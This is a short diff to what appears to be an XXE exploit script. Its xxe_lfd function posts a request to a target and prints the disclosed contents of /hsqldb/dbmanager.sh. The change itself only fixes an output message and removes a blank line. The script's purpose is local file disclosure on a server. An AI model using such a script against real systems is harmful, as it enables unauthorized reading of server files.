@@ -178,11 +178,10 @@ def xxe_lfd(lhost):
                 lfdRes = requests.post(xxe_url, headers=xxe_headers, data=xxe_data, timeout=10)
                 with open("response.txt", "w") as res:
                     res.write(lfdRes.text)
-                    print("[+] Response has been saved to response.json")
+                    print("[+] Response has been saved to response.txt")
                 print("[+] XXE Response:")
                 try:
                     print("[+] /hsqldb/dbmanager.sh content: \n", lfdRes.json())
-                    
                 except:
                     print(lfdRes.text)
             except Exception as e:
